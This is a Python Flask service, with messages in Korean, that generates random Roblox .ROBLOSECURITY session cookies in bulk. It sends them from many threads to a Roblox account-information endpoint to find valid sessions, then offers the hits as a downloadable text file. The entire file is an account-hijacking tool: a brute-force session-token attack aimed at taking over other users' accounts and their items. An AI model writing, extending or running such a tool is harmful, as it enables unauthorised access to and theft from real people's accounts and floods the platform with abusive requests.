import os
import random
import string
import threading
from queue import Queue
import requests
import time
from flask import Flask, send_file, jsonify

app = Flask(__name__)

INTRO = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
LETTERS = 'ABCDEF'
CHECK_URL = 'https://accountinformation.roblox.com/v1/birthdate'

cookie_queue = Queue()
print_lock = threading.Lock()
valid_cookies = []

def generate_cookie():
    return INTRO + ''.join(random.choices(LETTERS + string.digits, k=732))

def check_login(cookie):
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        res = requests.get(CHECK_URL, headers=headers, timeout=5)
        if res.status_code == 200:
            with print_lock:
                print(f"[로그인 성공] {cookie[:50]}...")
            return True
        else:
            with print_lock:
                print(f"[로그인 실패] 코드 {res.status_code}")
            return False
    except Exception as e:
        with print_lock:
            print(f"[오류] {e}")
        return False

def worker():
    while True:
        cookie = cookie_queue.get()
        if cookie is None:
            break
        if check_login(cookie):
            with print_lock:
                valid_cookies.append(cookie)
        time.sleep(random.uniform(0.3, 1.0))
        cookie_queue.task_done()

@app.route('/쿠키/<int:num>')
def run_all(num):
    global valid_cookies
    valid_cookies = []
    if num < 1 or num > 10000:
        return jsonify({"error": "1부터 10000 사이 숫자 입력해라"}), 400

    thread_count = min(50, max(5, num // 20))

    for _ in range(num):
        cookie_queue.put(generate_cookie())

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    cookie_queue.join()

    for _ in range(thread_count):
        cookie_queue.put(None)
    for t in threads:
        t.join()

    filename = f"roblox_cookies_{random.randint(1000,9999)}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        if valid_cookies:
            f.write("=== 로그인 성공 쿠키 ===\n\n")
            for c in valid_cookies:
                f.write(c + "\n\n")
            f.write(f"\n총 {len(valid_cookies)}개 유효 쿠키 발견\n")
        else:
            f.write("유효한 쿠키는 없었다...\n")

    print(f"완료! 유효 쿠키 개수: {len(valid_cookies)}")
    return send_file(filename, as_attachment=True, download_name="roblox_cookies.txt")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
